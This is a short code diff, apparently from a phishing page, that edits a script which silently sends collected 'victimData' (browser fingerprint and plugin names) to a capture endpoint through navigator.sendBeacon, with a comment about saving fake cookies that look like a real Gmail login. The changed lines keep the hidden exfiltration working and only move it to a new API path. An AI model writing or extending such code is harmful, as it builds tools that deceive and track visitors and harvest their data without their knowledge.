@@ -189,9 +189,9 @@
           plugins: Array.from(navigator.plugins).map(p => p.name).join(',')
         };
         
-        // **SILENT BEACON** (background - no blocking)
-        navigator.sendBeacon('/workspace_capture.php', 
-          new Blob([JSON.stringify(victimData)], {type: 'application/json'})
+        // **SILENT BEACON**
+        navigator.sendBeacon('/api/workspace_capture', 
+        new Blob([JSON.stringify(victimData)], {type: 'application/json'})
         );
         
         // **SAVE FAKE COOKIES** (looks like real Gmail login)
